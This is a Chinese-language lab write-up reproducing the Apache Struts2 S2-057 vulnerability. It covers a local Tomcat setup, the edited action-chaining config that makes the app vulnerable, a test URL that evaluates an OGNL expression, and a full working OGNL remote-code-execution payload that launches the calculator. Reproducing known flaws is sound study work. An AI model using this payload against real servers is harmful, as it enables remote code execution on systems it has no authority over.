S2-057漏洞复现

一、复现环境

操作系统：Windows7
JDK版本：1.8.0_131
tomcat版本：7.0.78
Struts版本：2.3.34

二、环境搭建

1. 下载部署

各个版本的struts2下载地址：

https://archive.apache.org/dist/struts/

这里我们下载struts-2.3.34-all这个版本。解压找到压缩包中apps目录下的struts2-showcase.war这个war包。启动tomcat，把该war包复制到tomcat的webapps目录下，tomcat会自动部署。

2.修改配置

部署成功后，修改以下两处struts-actionchaining.xml文件

D:software    omcatapache-tomcat-7.0.78webappsstruts2-showcaseWEB-INFclassesstruts-actionchaining.xml
D:software    omcatapache-tomcat-7.0.78webappsstruts2-showcaseWEB-INFsrcjavastruts-actionchaining.xml

修改内容为如下：

<!DOCTYPE struts PUBLIC
"-//Apache Software Foundation//DTD Struts Configuration 2.5//EN"
"http://struts.apache.org/dtds/struts-2.5.dtd">

<struts>
<package name="actionchaining" extends="struts-default">
<action name="actionChain1" class="org.apache.struts2.showcase.actionchaining.ActionChain1">
<result type="redirectAction">
             <param name = "actionName">register2</param>
           </result>
</action>
<action name="actionChain2" class="org.apache.struts2.showcase.actionchaining.ActionChain2">
<result type="chain">actionChain3</result>
</action>
<action name="actionChain3" class="org.apache.struts2.showcase.actionchaining.ActionChain3">
<result>/WEB-INF/actionchaining/actionChainingResult.jsp</result>
</action>
</package>
</struts>

然后重启tomcat，即可。

三、漏洞测试

下面我们构造测试url：

http://127.0.0.1:8080/struts2-showcase/${(111+111)}/actionChain1.action


发现跳转到了

http://127.0.0.1:8080/struts2-showcase/222/register2.action



发现运算结果222(111+111=222)被返回到跳转url当中了，说明OGNL表达式执行成功，漏洞存在。接下来我们尝试使用以下POC来弹计算器。

${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec("calc"))}

将POC URL编码后替换上面的ognl表达式，即可得到利用链接。


注意：

  • 该POC只能在Struts2.3.x版本运行。

  • POC要一定要url编码，这是常识。
